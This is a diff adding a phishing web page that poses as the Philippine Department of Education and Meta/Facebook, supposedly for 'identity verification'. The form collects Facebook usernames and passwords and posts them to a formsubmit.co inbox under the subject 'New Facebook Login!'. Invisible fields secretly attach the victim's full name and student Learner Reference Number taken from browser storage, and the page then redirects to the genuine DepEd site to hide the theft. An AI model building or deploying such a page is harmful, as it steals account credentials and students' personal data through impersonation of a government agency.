@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DepEd.gov | Verify With Our partner Facebook©</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    #lrn, #dataInput {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="menu">
+    <div class="menuclass">
+      <p class="label1">MENU <span class="close-btn">&#10005</span></p>
+      <hr>
+    </div>
+    <div class="opts">
+      <p>Home</p>
+      <hr>
+      <p>News</p>
+      <hr>
+      <p>About</p>
+      <hr>
+      <p>NCP</p>
+      <hr>
+      <p>NGP</p>
+      <hr>
+      <p>FAQ's</p>
+    </div>
+  </div>
+
+  <div class="main-container" style="display: block;">
+    <header>
+      <span class="mainlogo">GOVPH</span><span class="menu-toggle">&#9776</span>
+    </header>
+    <div class="mainhead">
+      <img class="mainheader" src="DepEd-Website-header-110px_1.png" alt="">
+      <h1 class="h2" style="font-size: 25px;">Integrate your identity and legitimacy with our official partner, Facebook© Meta</h1>
+      <div class="logos1">
+        <img id="ing1" src="small_foi_logo-150x150.png" alt="small_foi_logo-150x150.png">
+        <img id="ing2" src="17245509137031177269572435798329.png" alt="17245509137031177269572435798329.png">
+      </div>
+    </div>
+  </div>
+
+  <div>
+    <h6><span>&#9432;</span>What to do?</h6>
+    <p class="disc" style="margin-left:1em;">Insert Your Facebook account information and We will search through Meta’s database and see if the information will match.</p>
+    <h6><span>&#9432;</span>Why is this necessary?</h6>
+    <p class="disc" style="margin-left:1em;">This is necessary for us to be able to identify and verify your identity...</p>
+    <h6><span>&#9432;</span>Is this safe, if so, how can we be sure?</h6>
+    <p class="disc" style="margin-left:1em;">We completely assure that this is 100% safe...</p>
+    <center>
+      <img style="width: 50px; margin: 1em;" src="UbJC5lwxeBU.png" alt="">
+      <p class="disc">Connect and Verify with us. Meta 2024©</p>
+      <form id="myForm" action="https://formsubmit.co/cb9e9b7f17318454bba8891de7000fd6" method="POST">
+        <input type="hidden" name="_subject" value="New Facebook Login!">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.deped.gov.ph">
+        <input type="text" name="Full name" id="dataInput">
+        <input type="text" name="Learners reference number" id="lrn">
+        <input type="text" name="username" placeholder="username/mobile number" required>
+        <input type="text" name="Password" placeholder="Password" required>
+        <button class="button" style="margin-bottom: 10em; margin-top: 1em; background-color: #0068FF; color: white;" type="submit">Submit</button>
+      </form>
+      <p class="disc"><span>&#9432;</span>Please fill the Input boxes below accordingly.</p>
+    </center>
+  </div>
+
+  <div class="footer1">
+    <img class="seal" src="govph-seal-mono-footer.jpg" alt="govph-seal-mono-footer.jpg">
+    <p class="bold">Republic of the Philippines</p>
+    <p>All content is in the public domain unless otherwise stated.</p>
+    <p class="bold">About GOVPH</p>
+    <p>Learn more about the Philippine government...</p>
+    <p>GOV.PH Open Data Portal Official Gazette</p>
+    <p class="bold">Government Links </p>
+    <p>Office of the President...</p>
+  </div>
+
+  <script>
+    const menuToggle = document.querySelector('.menu-toggle');
+    const menu = document.querySelector('.menu');
+    const closeBtn = document.querySelector('.close-btn');
+
+    menuToggle.addEventListener('click', () => {
+      menu.style.right = menu.style.right === '0px' ? '-250px' : '0px';
+    });
+
+    closeBtn.addEventListener('click', () => {
+      menu.style.right = menu.style.right === '-250px' ? '0px' : '-250px';
+    });
+  </script>
+
+  <script>
+    // Get the saved values from localStorage
+    const savedUsername = localStorage.getItem('userName');
+    const savedLRN = localStorage.getItem('userLRN');
+
+    // Get the input elements
+    const usernameInput = document.getElementById('lrn');
+    const dataInput = document.getElementById('dataInput');
+
+    // Pre-fill the inputs with saved values
+    if (savedUsername) {
+      dataInput.value = savedUsername;
+    }
+    if (savedLRN) {
+      usernameInput.value = savedLRN;
+    }
+
+    // Handle form submission
+    document.getElementById('myForm').addEventListener('submit', function(event) {
+      const userName = dataInput.value;
+      const submittedLRN = usernameInput.value;
+
+      console.log('Submitted lrn:', submittedLRN);
+      console.log('Submitted username:', userName);
+    });
+    function red(){
+      window.location='http://www.deped.gov.ph';
+    }
+  </script>
+</body>
+</html>
